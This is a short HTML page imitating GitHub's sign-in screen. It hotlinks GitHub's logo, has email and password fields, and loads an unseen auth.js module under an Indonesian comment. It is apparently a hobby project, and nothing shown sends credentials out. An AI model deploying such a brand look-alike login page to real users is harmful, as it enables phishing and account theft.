<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <link rel="stylesheet" href="style.css">
</head>
<body class="login-body">
    <div class="login-container">
        <img src="https://github.githubassets.com/assets/GitHub-Mark-ea2971cee799.png" alt="GitHub Logo" class="logo">
        <h1>Sign in to GitHub</h1>
        <div class="login-box">
            <form id="login-form">
                <label for="email">Email address</label>
                <input type="email" id="email" name="email" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
                
                <button type="submit">Sign in / Sign up</button>
            </form>
            <p id="error-message" style="color: red; margin-top: 10px;"></p>
        </div>
        <div class="create-account-box">
            <p>New to GitHub? Create an account by filling the form above.</p>
        </div>
    </div>

    <!-- Memuat skrip sebagai module -->
    <script type="module" src="auth.js"></script>

</body>
</html>
